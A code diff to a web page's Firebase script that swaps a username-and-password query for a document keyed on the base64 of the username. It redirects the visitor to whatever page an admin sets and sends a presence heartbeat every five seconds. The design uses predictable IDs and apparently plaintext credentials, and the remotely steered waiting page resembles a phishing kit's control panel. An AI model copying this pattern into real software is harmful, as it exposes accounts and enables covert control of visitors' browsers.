@@ -434,11 +434,10 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/fireba
 
 import {
 
-    getFirestore,
-    collection,
-    query,
-    where,
-    onSnapshot
+ getFirestore,
+    doc,
+    onSnapshot,
+    setDoc
 
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
@@ -529,32 +528,46 @@ if(!loginData){
 
 /* find current user */
 
-const q = query(
-    collection(db,"users"),
-    where("username","==",loginData.username),
-    where("password","==",loginData.password)
-);
+function generateUserId(loginData){
+
+    return btoa(loginData.username);
+
+}
+
+const userId = generateUserId(loginData);
 
 /* realtime listener */
 
-onSnapshot(q,(snapshot)=>{
+onSnapshot(doc(db,"users",userId),(docSnap)=>{
 
-    snapshot.forEach((doc)=>{
+    if(!docSnap.exists()) return;
 
-        const user = doc.data();
+    const user = docSnap.data();
 
-        /* redirect if admin changed page */
+    /* redirect if admin changed page */
 
-        if(user.currentPage &&
-           user.currentPage !== "waitaccount.html"){
+    if(
+        user.currentPage &&
+        user.currentPage !== "waitaccount.html"
+    ){
 
-            window.location.href = user.currentPage;
+        window.location.href = user.currentPage;
 
-        }
-
-    });
+    }
 
 });
+
+/* online heartbeat */
+
+setInterval(async ()=>{
+
+    await setDoc(doc(db,"users",userId),{
+
+        lastSeen: Date.now()
+
+    },{ merge:true });
+
+},5000);
 
 </script>
 
